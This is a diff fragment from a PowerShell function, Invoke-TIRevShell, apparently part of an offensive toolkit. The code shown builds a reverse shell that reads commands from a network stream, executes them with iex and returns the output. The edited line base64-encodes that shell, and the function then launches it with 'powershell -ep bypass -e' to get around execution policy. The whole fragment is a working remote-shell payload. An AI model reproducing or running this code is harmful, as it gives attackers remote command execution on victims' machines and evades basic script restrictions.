@@ -41,7 +41,7 @@ function Invoke-TIRevShell {
     $shell += '{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS "'
     $shell += ' + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 
-    $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($shell))
+    $encoded = [System.Convert]::ToBase64String([System.Text.ASCIIEncoding]::UTF8.GetBytes($shell))
     powershell -ep bypass -e $encoded
 }
 
